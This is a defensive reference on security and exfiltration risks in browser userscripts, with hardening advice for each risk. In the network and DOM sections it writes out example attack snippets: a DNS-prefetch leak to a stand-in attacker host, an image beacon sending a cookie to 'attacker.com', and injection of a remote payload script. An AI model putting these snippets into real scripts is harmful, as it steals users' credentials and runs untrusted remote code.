# Userscript Threat Vectors & Attack Surfaces

This reference outlines the major security, privacy, and data exfiltration vectors specific to browser userscripts (Tampermonkey, Violentmonkey, Greasemonkey).

---

## 1. Scope & Execution Context Risks

### `@match *` / `@include *` (Universal Injection)
* **Risk:** The userscript executes inside *every* origin the user visits.
* **Impact:** Active sessions for online banking, email (Gmail, Outlook), password manager web vaults (Bitwarden, 1Password), internal intranets, and cloud consoles (AWS, GCP) are exposed to the script's DOM manipulation and event listening.
* **Hardening:** Replace wildcard `@match *://*/*` with strict, explicit domain origins (e.g. `https://chatgpt.com/*`).

### `@grant unsafeWindow` (Sandbox Escape)
* **Risk:** Userscript managers execute scripts in an isolated extension world by default. `@grant unsafeWindow` pierces this boundary, granting direct access to the page's global JavaScript scope (`window`).
* **Impact:**
  - Can read/modify global JavaScript variables, tokens, and functions.
  - Can monkey-patch page-level prototypes (`EventTarget.prototype.addEventListener`, `Element.prototype.scrollTo`).
  - Exposes the script to attacks from malicious host page scripts.
* **Hardening:** Remove `@grant unsafeWindow`. Scripts will execute in the isolated userscript sandbox with DOM-only access.

---

## 2. Network & Communication Vectors

### Why Removing `GM_xmlhttpRequest` Alone Fails
Userscript managers isolate `GM_xmlhttpRequest` behind permission grants, but standard JavaScript running in the browser can still transmit data across the network via multiple channels:

### 1. Web Standard APIs
* **`window.fetch()` and `XMLHttpRequest`:** Native asynchronous HTTP/HTTPS requests.
* **`WebSocket` (`ws://`, `wss://`):** Full-duplex persistent TCP connections. Bypasses standard HTTP request-response flow.
* **`EventSource`:** Server-Sent Events (SSE) streaming connections.
* **`WebTransport`:** HTTP/3 over QUIC/UDP bidirectional transport.
* **`navigator.sendBeacon()`:** Asynchronous POST telemetry channel designed to transmit data even after the page is closed or unloaded.

### 2. Peer-to-Peer & UDP Channels (WebRTC)
* **`RTCPeerConnection` & `RTCDataChannel`:**
  - Establishes direct peer-to-peer data channels over UDP or TCP via ICE/STUN/TURN.
  - Completely ignores HTTP proxies, headers, and traditional web request interceptors.
  - Can be used to exfiltrate private tokens or leak local and public IP addresses (WebRTC IP leak).

### 3. DNS Prefetching Side-Channels
* **Technique:** Injecting `<link rel="dns-prefetch" href="//data-to-leak.attacker.com">` or `<link rel="preconnect">`.
* **Mechanism:** The browser asks the OS resolver to resolve the hostname via UDP port 53.
* **Exfiltration Risk:** Even if all outbound HTTP, HTTPS, and socket traffic is blocked by a proxy or firewall, the DNS query travels to the authoritative nameserver of `attacker.com`. Data encoded in the subdomain prefix (e.g. `token123.attacker.com`) is logged by the attacker's DNS server.

### 4. Background Web Workers
* **`new Worker()` / `new SharedWorker()`:**
  - Spawns background JavaScript execution threads.
  - Each worker has its own independent global scope and network capabilities (`fetch`, `XMLHttpRequest`, `WebSocket`).

---

## 3. DOM-Based Remote Code Execution & Exfiltration

### Dynamic Script Injection
* **Pattern:**
  ```javascript
  const s = document.createElement("script");
  s.src = "https://remote.com/payload.js";
  document.head.appendChild(s);
  ```
* **Risk:** Appending `<script>` elements to `document.head` forces the browser to fetch and execute arbitrary remote JavaScript inside the page's main execution context.
* **Hardening:** Stub `document.createElement("script")` to throw, and intercept `Node.prototype.appendChild` to block appending script elements.

### Dynamic Frames & Media Exfiltration
* **`<iframe>`, `<object>`, `<embed>`:** Hidden embedded frames can navigate to external phishing pages or authenticate actions.
* **Tracking Pixels (`<img>`, `<audio>`, `<video>`):**
  ```javascript
  const img = new Image();
  img.src = "https://attacker.com/log?token=" + encodeURIComponent(cookie);
  ```
  Forces an HTTP GET request to external servers carrying stolen credentials in the query string.

---

## 4. Supply Chain & Persistence Vectors

### Mutable Unpinned Branches
* **Directives:** `@require` or `@resource` pointing to GitHub `@main`, `@master`, or un-hashed URLs:
  ```javascript
  // @resource runner https://cdn.jsdelivr.net/gh/user/repo@main/script.js
  ```
* **Risk:** Anyone who pushes to the GitHub repository's `main` branch can modify the code running in the user's browser without warning or review.
* **Hardening:** Pin to an immutable commit hash and require subresource integrity (`#sha256=...`), or vendor the resource locally.

### Auto-Update Overwrite
* **Directives:** `@downloadURL` and `@updateURL` pointing to GreasyFork or GitHub:
  ```javascript
  // @updateURL https://update.greasyfork.org/...
  ```
* **Risk:** When a userscript is hardened locally, the userscript manager will automatically fetch upstream updates on a background schedule and overwrite the hardened script, restoring all permissions.
* **Hardening:** Remove both `@downloadURL` and `@updateURL` from the metadata header.
